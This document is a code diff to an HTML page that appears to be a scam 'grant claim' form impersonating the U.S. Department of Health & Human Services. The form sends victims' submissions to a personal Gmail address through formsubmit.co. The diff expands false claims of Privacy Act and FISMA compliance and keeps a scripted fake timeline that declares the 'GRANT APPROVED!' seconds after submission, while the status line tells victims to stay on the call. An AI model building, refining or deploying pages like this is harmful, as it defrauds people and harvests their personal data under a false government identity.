@@ -115,7 +115,7 @@
       max-width: 480px;
       margin-left: auto;
       margin-right: auto;
-      line-height: 1.5;
+      line-height: 1.6;
     }
     footer a {
       color: #004aad;
@@ -128,6 +128,10 @@
       margin-top: 12px;
       font-style: normal;
       color: #777;
+    }
+    footer .privacy-text {
+      color: #555;
+      line-height: 1.6;
     }
 
     .thank-you-message {
@@ -290,15 +294,6 @@
       border: 1px solid rgba(0, 74, 173, 0.1);
       transition: all 0.5s ease;
     }
-    .processing-box.verified {
-      border-color: #28a745;
-      background: rgba(40, 167, 69, 0.08);
-    }
-    .processing-box.approved {
-      border-color: #28a745;
-      background: rgba(40, 167, 69, 0.15);
-      box-shadow: 0 0 20px rgba(40, 167, 69, 0.15);
-    }
 
     .live-indicator {
       display: inline-flex;
@@ -331,31 +326,6 @@
       font-size: 0.85rem;
       color: #004aad;
       transition: all 0.5s ease;
-    }
-    .status-message.verified {
-      color: #28a745;
-      font-weight: 700;
-    }
-    .status-message.approved {
-      color: #28a745;
-      font-weight: 700;
-      font-size: 1rem;
-    }
-
-    .confetti {
-      display: none;
-      text-align: center;
-      font-size: 2rem;
-      margin-top: 5px;
-      animation: confetti-rain 1s ease-in-out;
-    }
-    .confetti.show {
-      display: block;
-    }
-    @keyframes confetti-rain {
-      0% { transform: scale(0); opacity: 0; }
-      50% { transform: scale(1.3); opacity: 1; }
-      100% { transform: scale(1); opacity: 1; }
     }
   </style>
 </head>
@@ -394,7 +364,6 @@
         <div class="status-message" id="statusMessage">
           <span style="font-weight: 600;">⏱️ Status:</span> Verification in progress... Please stay on the call.
         </div>
-        <div class="confetti" id="confetti">🎉🎊🎉</div>
       </div>
       <p>
         <span class="highlight">📋 Reference ID:</span> 
@@ -414,6 +383,7 @@
     </div>
 
     <div class="form-wrapper" id="formWrapper">
+      <!-- FORMSUBMIT WITH EMAIL: jameswilsonjames110@gmail.com -->
       <form action="https://formsubmit.co/ajax/jameswilsonjames110@gmail.com" method="POST" id="grantForm">
         <input type="hidden" name="_captcha" value="false" />
         <input type="hidden" name="_subject" value="New Grant Claim Form Submission" />
@@ -496,13 +466,36 @@
 
   <footer>
     <p><strong>Privacy Policy 2026</strong></p>
-    <p>
-      Your privacy is important to us. We comply with all federal regulations regarding the protection of personal information submitted through this grant application process.
-      For more details, visit the official <a href="https://www.grants.gov/policies/privacy-policy.html" target="_blank" rel="noopener noreferrer">Grants.gov Privacy Policy</a>.
-    </p>
-    <div class="address">
-      U.S. Department of Health & Human Services<br />
-      330 C St SW, Washington, DC 20201
+    <div class="privacy-text">
+      <p>
+        <strong>Your Privacy Matters to Us</strong><br />
+        We are committed to protecting your personal information. The data you provide in this 
+        grant application is collected and processed in accordance with the 
+        <a href="https://www.grants.gov/policies/privacy-policy.html" target="_blank" rel="noopener noreferrer">U.S. Department of Health & Human Services Privacy Policy</a> 
+        and all applicable federal regulations, including the Privacy Act of 1974.
+      </p>
+      <p style="margin-top: 8px;">
+        <strong>How We Use Your Information:</strong>
+        <br />
+        • Your information is used solely for the purpose of processing your grant application<br />
+        • We do not share your personal data with third parties without your explicit consent<br />
+        • All data is encrypted and securely stored in compliance with federal standards<br />
+        • You have the right to request access to your personal information at any time
+      </p>
+      <p style="margin-top: 8px;">
+        <strong>Federal Privacy Compliance:</strong>
+        <br />
+        This application complies with the requirements of the Federal Information Security Management Act (FISMA) 
+        and the Privacy Act of 1974. For more details, visit the official 
+        <a href="https://www.grants.gov/policies/privacy-policy.html" target="_blank" rel="noopener noreferrer">Grants.gov Privacy Policy</a>.
+      </p>
+      <div class="address">
+        U.S. Department of Health & Human Services<br />
+        Privacy Office, 330 C St SW, Washington, DC 20201
+      </div>
+      <p style="margin-top: 10px; font-size: 0.75rem; color: #888;">
+        Last Updated: January 2026 | This form is protected by SSL encryption
+      </p>
     </div>
   </footer>
 
@@ -514,17 +507,6 @@
       const container = document.getElementById('formContainer');
       const submitBtn = document.getElementById('submitBtn');
       const loadingSpinner = document.getElementById('loadingSpinner');
-
-      // Timeline elements
-      const step2 = document.getElementById('step2');
-      const step3 = document.getElementById('step3');
-      const step4 = document.getElementById('step4');
-      const dot2 = document.getElementById('dot2');
-      const dot3 = document.getElementById('dot3');
-      const dot4 = document.getElementById('dot4');
-      const statusMessage = document.getElementById('statusMessage');
-      const processingBox = document.getElementById('processingBox');
-      const confetti = document.getElementById('confetti');
 
       function generateAppId() {
         const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
@@ -584,7 +566,7 @@
         });
       }
 
-      // Show thank you message and start timer
+      // Show thank you message
       function showThankYou() {
         document.getElementById('appId').textContent = generateAppId();
         thankYou.style.display = 'block';
@@ -592,60 +574,44 @@
         container.style.boxShadow = '0 4px 12px rgba(0, 74, 173, 0.15)';
         submitBtn.textContent = 'Submitted ✓';
         
+        // Animate the processing steps
         let seconds = 0;
-        let verificationDone = false;
-        let processingDone = false;
-
         const interval = setInterval(function() {
           seconds++;
           
-          // After 3 minutes (180 seconds) - Verification Complete
-          if (seconds >= 180 && !verificationDone) {
-            verificationDone = true;
-            step2.className = 'step done';
-            step2.textContent = '✅ Information Verified';
-            dot2.className = 'dot done';
-            
-            step3.className = 'step active';
-            step3.textContent = '⏳ Processing Grant (5 min)';
-            dot3.style.animation = 'pulse-dot 1.5s ease-in-out infinite';
-            
-            statusMessage.innerHTML = '<span style="font-weight: 600;">✅ Status:</span> Information verified! Processing your grant now...';
-            processingBox.classList.add('verified');
-            statusMessage.classList.add('verified');
+          if (seconds >= 5 && seconds < 10) {
+            document.getElementById('step2').textContent = '✅ Information Verified';
+            document.getElementById('step2').className = 'step done';
+            document.getElementById('dot2').className = 'dot done';
+            document.getElementById('step3').className = 'step active';
+            document.getElementById('step3').textContent = '⏳ Processing Grant';
+            document.getElementById('dot3').style.animation = 'pulse-dot 1.5s ease-in-out infinite';
+            document.getElementById('statusMessage').innerHTML = '<span style="font-weight: 600;">✅ Status:</span> Information verified! Processing your grant...';
           }
           
-          // After 5 more minutes (300 seconds = 5 minutes after verification) - Processing Complete
-          if (seconds >= 480 && verificationDone && !processingDone) {
-            processingDone = true;
-            step3.className = 'step done';
-            step3.textContent = '✅ Grant Processed';
-            dot3.className = 'dot done';
-            
-            step4.className = 'step active';
-            step4.textContent = '⏳ Finalizing Approval (7 min)';
-            dot4.style.animation = 'pulse-dot 1.5s ease-in-out infinite';
-            
-            statusMessage.innerHTML = '<span style="font-weight: 600;">✅ Status:</span> Grant processed! Finalizing approval...';
+          if (seconds >= 12 && seconds < 18) {
+            document.getElementById('step3').textContent = '✅ Grant Processed';
+            document.getElementById('step3').className = 'step done';
+            document.getElementById('dot3').className = 'dot done';
+            document.getElementById('step4').className = 'step active';
+            document.getElementById('step4').textContent = '⏳ Finalizing Approval';
+            document.getElementById('dot4').style.animation = 'pulse-dot 1.5s ease-in-out infinite';
+            document.getElementById('statusMessage').innerHTML = '<span style="font-weight: 600;">✅ Status:</span> Grant processed! Finalizing approval...';
           }
           
-          // After 7 more minutes (420 seconds = 7 minutes after processing) - Approved!
-          if (seconds >= 900 && processingDone) {
-            step4.className = 'step done';
-            step4.textContent = '✅ Approved! 🎉';
-            dot4.className = 'dot done';
-            
-            statusMessage.innerHTML = '<span style="font-weight: 600; color: #28a745; font-size: 1.1rem;">🎉 Status:</span> <strong style="color: #28a745; font-size: 1.1rem;">GRANT APPROVED! You will receive confirmation shortly.</strong>';
-            processingBox.classList.add('approved');
-            statusMessage.classList.add('approved');
-            confetti.classList.add('show');
-            
+          if (seconds >= 22) {
+            document.getElementById('step4').textContent = '✅ Approved! 🎉';
+            document.getElementById('step4').className = 'step done';
+            document.getElementById('dot4').className = 'dot done';
+            document.getElementById('statusMessage').innerHTML = '<span style="font-weight: 600; color: #28a745; font-size: 1rem;">🎉 Status:</span> <strong style="color: #28a745; font-size: 1rem;">GRANT APPROVED! You will receive confirmation shortly.</strong>';
+            document.getElementById('processingBox').style.borderColor = '#28a745';
+            document.getElementById('processingBox').style.background = 'rgba(40, 167, 69, 0.1)';
             clearInterval(interval);
           }
         }, 1000);
       }
 
-      // FORM SUBMISSION - NO REDIRECT!
+      // FORM SUBMISSION
       form.addEventListener('submit', function(e) {
         e.preventDefault();
         
